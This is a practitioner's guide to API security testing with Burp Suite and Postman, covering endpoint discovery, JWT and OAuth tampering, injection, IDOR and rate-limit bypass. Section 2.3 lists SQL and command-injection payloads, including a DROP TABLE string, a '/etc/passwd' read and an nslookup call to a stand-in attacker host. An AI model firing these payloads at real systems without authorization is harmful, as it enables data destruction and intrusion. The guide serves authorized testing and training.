# API Testing with Burp Suite & Postman
**Professional API Security Testing Guide** | Last Updated: 2026-04-22

---

## Overview

This playbook focuses on practical API security testing using two industry-standard tools:
- **Burp Suite** - Advanced intercepting proxy and vulnerability scanner
- **Postman** - API development, testing, and documentation platform

Both tools complement each other: Postman for API exploration and request building, Burp Suite for deep security testing and exploitation.

**When to use each:**
- **Postman:** API discovery, endpoint mapping, authorization testing, request building
- **Burp Suite:** Vulnerability scanning, request manipulation, exploitation, fuzzing

---

## Phase 1: API Discovery & Mapping with Postman

### 1.1 Setting Up Postman for API Testing

**Objective:** Configure Postman for security testing workflows

**Setup Steps:**
- [ ] Download Postman (app or web version)
- [ ] Create workspace for API testing
- [ ] Configure proxy settings (to route through Burp Suite)
  - Settings → Proxy → Enable proxy checkbox
  - Set proxy to `127.0.0.1:8080` (Burp default)
- [ ] Import API documentation
  - OpenAPI/Swagger JSON
  - Postman collections from public sources
- [ ] Create environment variables for:
  - Base URL (`{{base_url}}`)
  - API keys (`{{api_key}}`)
  - Tokens (`{{bearer_token}}`)
  - User IDs (`{{user_id}}`)

**Benefits:**
- Centralize all API requests
- Easy parameter substitution
- Test multiple environments (dev, staging, prod)
- Generate automated test suites

---

### 1.2 Discovering API Endpoints

**Objective:** Map all accessible API endpoints and methods

**Postman Workflow:**
1. **Import API Documentation**
   - File → Import → Paste OpenAPI/Swagger URL or JSON
   - Postman auto-generates all endpoints and methods

2. **Manual Endpoint Discovery**
   - Create requests for common API paths:
     - `/api/v1/users`
     - `/api/v1/products`
     - `/api/v1/orders`
     - `/api/v1/admin`
   - Test HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS)

3. **Build Endpoint Collection**
   - Organize by resource type
   - Save requests with examples
   - Create pre-request scripts for setup
   - Add tests for response validation

4. **Proxy Through Burp**
   - All Postman requests pass through Burp Suite
   - Allows inspection and modification in Burp
   - Enable Burp → Proxy → Intercept to capture requests

**Test Cases:**
- [ ] GET requests to list resources
- [ ] POST requests to create resources
- [ ] PUT/PATCH requests to modify resources
- [ ] DELETE requests to remove resources
- [ ] OPTIONS requests to enumerate methods
- [ ] HEAD requests to test caching

---

### 1.3 Identifying Authentication Mechanisms

**Objective:** Determine how API authenticates requests

**Postman Tests:**
1. **Send unauthenticated requests**
   - Record response codes (401, 403, 200)
   - Document error messages

2. **Test authentication types**
   - **API Key:** Add header `X-API-Key: {{api_key}}`
   - **Bearer Token:** Add header `Authorization: Bearer {{token}}`
   - **Basic Auth:** Use Postman Auth tab → Basic Auth
   - **OAuth 2.0:** Use Postman Auth tab → OAuth 2.0
   - **Custom headers:** Add as needed

3. **Create pre-request scripts**
   ```javascript
   // Auto-add auth header to all requests
   pm.request.headers.add({
       key: "Authorization",
       value: "Bearer " + pm.environment.get("bearer_token")
   });
   ```

4. **Test token handling**
   - Token location (header, body, cookie, parameter)
   - Token format (JWT, opaque, etc.)
   - Token expiration behavior
   - Refresh token mechanism

---

## Phase 2: Vulnerability Discovery with Burp Suite

### 2.1 Setting Up Burp Suite for API Testing

**Objective:** Configure Burp Suite to intercept and analyze API traffic

**Setup Steps:**
- [ ] Launch Burp Suite (Community or Pro)
- [ ] Go to Proxy → Options
  - Ensure Burp listens on `127.0.0.1:8080`
  - Confirm Proxy running
- [ ] Install Burp CA certificate in browser/system
- [ ] Create Burp project for API testing
- [ ] Configure scope (Tools → Scope)
  - Add API domain to scope
  - Exclude unrelated traffic
- [ ] Enable Proxy → Intercept
  - Route all API requests through Burp

**Tools within Burp for API testing:**
- **Proxy:** Intercept and modify requests/responses
- **Repeater:** Resend and manipulate individual requests
- **Intruder:** Fuzz parameters and test for injection
- **Scanner:** Automated vulnerability scanning
- **Comparator:** Compare request/response pairs
- **Decoder:** Encode/decode payloads (Base64, URL, JWT, etc.)

---

### 2.2 API Authentication Testing

**Objective:** Test authentication bypass and token vulnerabilities

**Burp Repeater Workflow:**

1. **JWT Token Analysis**
   - Intercept request with JWT in header
   - Right-click → Send to Repeater
   - Modify token using Burp Decoder
   - Test modifications:
     - Remove signature (set to empty)
     - Change algorithm to "none"
     - Modify payload (user ID, permissions)
     - Test with expired tokens
   - Resend modified request

2. **API Key Testing**
   - Test multiple API keys in same request
   - Test API key in different locations (header, param, cookie)
   - Test reversed/reversed API key
   - Test API key with special characters

3. **Bearer Token Testing**
   - Test expired tokens
   - Test tokens from other users
   - Test modified token claims
   - Test token reuse after logout

4. **OAuth Vulnerabilities**
   - Test missing state parameter
   - Test redirect URI bypass
   - Test scope elevation
   - Test token capture via redirect

---

### 2.3 Injection Testing with Burp Intruder

**Objective:** Test for injection vulnerabilities in API parameters

**SQL Injection Testing:**
1. Select request in Proxy → Send to Intruder
2. Set attack target: `Intruder → Target`
3. Define injection points:
   - Highlight vulnerable parameter
   - Click "Add §" to mark injection point
4. Load payload list:
   - Payloads → Payload type → Simple list
   - Load SQL injection wordlist (Burp includes built-in lists)
5. Configure attack settings:
   - Request headers: Match on "error" responses
   - Resource pool: Threads = 1 (avoid rate limiting)
6. Run attack and analyze results:
   - Look for different response lengths/times
   - Check for error messages revealing database type
   - Identify injectable parameters

**SQL Injection Payloads:**
```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
' AND SLEEP(5)--
'; DROP TABLE users--
```

**Command Injection Testing:**
```
; whoami
| cat /etc/passwd
` id `
$(nslookup attacker.com)
```

**Common API injection points:**
- Query parameters: `?search=value`
- POST body fields: `{"name": "value"}`
- Headers: `X-Custom-Header: value`
- Path parameters: `/api/users/{id}`

---

### 2.4 Authorization & Access Control Testing

**Objective:** Test for broken access control in APIs

**Burp Testing Workflow:**

1. **Horizontal Privilege Escalation**
   - Authenticate as User A
   - Capture request to access User B's data
   - Send to Repeater
   - Modify user ID/parameter to access other users
   - Test: `/api/users/1/profile` → `/api/users/2/profile`

2. **Vertical Privilege Escalation**
   - Authenticate as regular user
   - Attempt admin-only endpoints:
     - `/api/admin/users`
     - `/api/admin/settings`
     - `/api/admin/logs`
   - Test parameter modification:
     - `?role=admin`
     - `?is_admin=true`
     - `&permission=delete`

3. **IDOR (Insecure Direct Object References)**
   - Collect valid object IDs
   - Test sequential IDs: 1, 2, 3...
   - Test predictable IDs: user_1, user_2...
   - Use Intruder for automated ID enumeration

**Test Cases:**
- [ ] Access other users' data
- [ ] Access admin-only endpoints
- [ ] Modify objects you don't own
- [ ] Delete others' data
- [ ] Change others' permissions

---

### 2.5 Business Logic Testing

**Objective:** Test application-level vulnerabilities in API logic

**Postman Pre-request Scripts:**
```javascript
// Test price tampering
pm.environment.set("price", 0.01); // Set artificially low price

// Test quantity limits
pm.environment.set("quantity", 999999); // Order excessive quantity

// Test race conditions
// Run multiple requests simultaneously
```

**Burp Repeater Tests:**

1. **Rate Limiting Bypass**
   - Send request → Burp Repeater
   - Modify headers to bypass rate limits:
     - Add `X-Forwarded-For: 1.1.1.1` (change IP)
     - Modify `User-Agent`
     - Add custom headers
   - Test rapid successive requests

2. **Resource Exhaustion**
   - Request large data sets: `/api/users?limit=999999`
   - Request deeply nested relationships
   - Request expensive operations repeatedly

3. **State Management**
   - Test concurrent requests
   - Test request ordering dependency
   - Test state changes without authorization

---

### 2.6 API Scanner - Automated Vulnerability Detection

**Objective:** Use Burp's built-in scanner for automatic testing

**Scanner Setup:**
1. Proxy → Click on target request
2. Right-click → Do active scan
3. Burp Scanner configuration:
   - Scan type: Audit checks
   - Scope: Target scope only
4. Review findings:
   - Vulnerability type
   - Severity (Critical, High, Medium, Low, Info)
   - Location (parameter, header, body)

**Common Scanner Findings:**
- SQL Injection
- Cross-site Scripting (XSS)
- XML External Entity (XXE)
- Command Injection
- Server-side Request Forgery (SSRF)
- Insecure Deserialization
- Weak Cryptography

---

## Phase 3: Response Analysis & Data Exposure

### 3.1 Analyzing API Responses

**Objective:** Identify data exposure and information leakage

**Burp Comparator Workflow:**
1. Capture authenticated request
2. Send to Comparator
3. Compare with unauthenticated version
4. Identify differences:
   - Exposed user IDs
   - Sensitive business data
   - Internal system information
   - API keys or tokens in responses

**Postman Response Tests:**
```javascript
// Test for sensitive data in response
tests["No password in response"] = !pm.response.text().includes("password");
tests["No API key in response"] = !pm.response.text().includes("api_key");
tests["No internal IPs"] = !pm.response.text().match(/192\.168\.|10\.0\./);
```

**Common Data Exposures:**
- User IDs, emails, phone numbers
- Internal user comments or metadata
- Server versions and technologies
- File paths and internal URLs
- API keys or tokens
- Database names
- Debugging information

---

### 3.2 Information Disclosure in Error Messages

**Objective:** Test for excessive error information

**Testing in Burp Repeater:**
1. Send requests with invalid input
2. Analyze error responses:
   - SQL error messages (reveals database type)
   - Stack traces (reveals framework/language)
   - Path disclosure (reveals file structure)
   - Exception details

**Test Payloads:**
- Invalid JSON: `{invalid}`
- Large numbers: `id=99999999999999999999`
- Special characters: `id='; --`
- Empty values: `id=`
- Format mismatch: `id=abc` (when expecting number)

---

## Phase 4: Advanced Testing

### 4.1 Fuzzing with Burp Intruder

**Objective:** Discover hidden parameters and endpoints

**Fuzzing Workflow:**
1. Open request in Repeater
2. Highlight parameter to fuzz
3. Send to Intruder
4. Payloads → Load wordlist:
   - API parameter names: `id`, `user_id`, `api_key`, `token`, etc.
   - Common endpoints: `admin`, `test`, `debug`, `internal`
5. Run attack with settings:
   - Grep - Match: Empty (shows all responses)
   - Filter by status code (200, 403, 404, 500)

**Wordlists for API Fuzzing:**
- SecLists: `discovery/apis/*`
- OWASP Fuzzing Strings
- Custom wordlists based on API patterns

---

### 4.2 Rate Limiting & DDoS Testing

**Objective:** Identify and bypass rate limiting

**Burp Intruder Setup:**
1. Select request → Send to Intruder
2. Set number list: 1 to 1000 (for 1000 requests)
3. Attack type: Sniper
4. Run attack with monitoring:
   - Burp → Options → Rate limiting
   - Add delays between requests if needed
5. Analyze results:
   - Look for 429 (Too Many Requests)
   - Look for response changes after X requests
   - Identify rate limit reset patterns

**Bypass Techniques:**
- Rotate IP addresses (X-Forwarded-For header)
- Rotate User-Agent
- Use different authentication tokens
- Add random parameters (`?cache_bust=12345`)

---

### 4.3 API Documentation Testing

**Objective:** Test if API behavior matches documentation

**Postman Tests:**
```javascript
// Verify documented response structure
tests["Has user_id field"] = pm.response.json().hasOwnProperty("user_id");
tests["Has email field"] = pm.response.json().hasOwnProperty("email");
tests["Response status is 200"] = pm.response.code === 200;
tests["Response time < 500ms"] = pm.response.responseTime < 500;
```

**Verification Checklist:**
- [ ] Documented endpoints exist and work
- [ ] Request/response formats match documentation
- [ ] Error codes match documentation
- [ ] Pagination works as documented
- [ ] Filtering/sorting work as documented
- [ ] Rate limits match documentation

---

## Reporting Findings

### Using Burp Professional Report Generation

**Generate Report:**
1. Dashboard → Generate Report
2. Select scope: Target scope
3. Included types: Select vulnerability types to include
4. Report format: HTML or PDF
5. Customize details, executive summary, remediation

**Report Organization:**
- Critical findings (immediate action needed)
- High findings (exploit easily possible)
- Medium findings (exploitation possible)
- Low findings (security improvement)
- Informational findings

### Postman Collection Export for Testing Documentation

**Export Test Results:**
1. Collection → Export
2. Format: JSON
3. Include:
   - All requests tested
   - Response examples
   - Test scripts
   - Environment variables
4. Share with team for reproducibility

---

## Best Practices

✅ **DO:**
- Test in isolated environment (not production)
- Get written authorization before testing
- Document all findings with screenshots
- Test both happy path and error scenarios
- Combine Postman (discovery) with Burp (security testing)
- Save collections for regression testing
- Test API versioning endpoints separately

❌ **DON'T:**
- Test production APIs without authorization
- Leave intercept enabled during normal browsing
- Share API keys or tokens in reports
- Modify request data without understanding impact
- Skip testing authentication mechanisms
- Ignore rate limiting during testing

---

## Tool Comparison: Curl vs Postman vs Burp

| Feature | Curl | Postman | Burp Suite |
|---------|------|---------|-----------|
| **API Discovery** | Manual | ✓ Excellent | Good |
| **Request Building** | Command-line | ✓ UI-based | Repeater |
| **Authentication** | Manual headers | ✓ Built-in | Manual |
| **Automation** | Scripts | ✓ Collections | Macros |
| **Vulnerability Scanning** | None | Limited | ✓ Comprehensive |
| **Interception** | None | Via proxy | ✓ Built-in |
| **Reporting** | None | Limited | ✓ Professional |
| **Learning Curve** | Easy | Easy | Moderate |
| **Cost** | Free | Free/Paid | Community/Pro |

---

## Resources

**Official Documentation:**
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [Postman Learning Center](https://learning.postman.com/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

**Wordlists & Payloads:**
- SecLists: https://github.com/danielmiessler/SecLists
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings

**Practice Environments:**
- OWASP WebGoat
- HackTheBox API challenges
- TryHackMe API rooms
- PortSwigger Academy labs

---

**Last Updated:** 2026-04-22  
**Author:** Security Testing Team  
**License:** MIT
